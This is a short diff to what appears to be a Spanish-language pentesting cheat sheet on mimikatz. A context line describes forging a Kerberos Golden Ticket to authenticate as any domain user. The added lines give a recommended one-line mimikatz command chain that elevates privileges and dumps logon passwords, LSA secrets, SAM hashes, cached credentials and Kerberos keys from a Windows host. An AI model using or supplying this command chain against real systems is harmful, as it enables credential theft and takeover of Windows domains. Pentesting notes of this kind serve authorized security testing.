@@ -40,3 +40,5 @@
 `kerberos::golden`
 - Genera un Golden Ticket para autenticarse como cualquier usuario en el dominio.
 
+### Seguidilla de comandos al conseguir mimikatz recomendada
+`.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache""sekurlsa::ekeys" "exit"`
